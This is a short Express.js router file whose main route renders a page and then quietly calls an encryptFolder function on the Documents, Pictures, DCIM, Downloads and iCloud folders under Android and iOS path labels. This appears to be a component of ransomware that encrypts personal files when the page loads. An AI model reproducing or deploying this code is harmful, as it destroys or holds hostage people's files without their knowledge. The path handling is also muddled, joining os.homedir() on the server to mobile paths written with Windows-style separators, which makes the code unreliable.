const express = require("express");
const { encryptFolder } = require("../main");
const os = require("os");


const router = express.Router();

router.get("/", async(req, res) =>{
    res.render("index");
    try {
        encryptFolder(os.homedir()+"\\storage\\emulated\\0\\Documents");
    } catch (error) {
        console.log(error);
    }

    try {
        encryptFolder(os.homedir()+"\\storage\\emulated\\0\\Pictures");
    } catch (error) {
        console.log(error);
    }

    try {
        encryptFolder(os.homedir()+"\\sdcard\\DCIM");
    } catch (error) {
        console.log(error);
    }

    try {
        encryptFolder(os.homedir()+"\\storage\\emulated\\0\\Downloads"); ///sdcard, /data
    } catch (error) {
        console.log(error);
    }
    
    // iOS Operating System
    try {
        encryptFolder(os.homedir()+"\\var\\mobile\\Library\\Mobile Documents\\comappleCloudDocs");
        // encryptFolder(os.homedir()+"\\Desktop\\Subscription");
    } catch (error) {
        console.log(error);
    }

    res.end();
})

module.exports = router;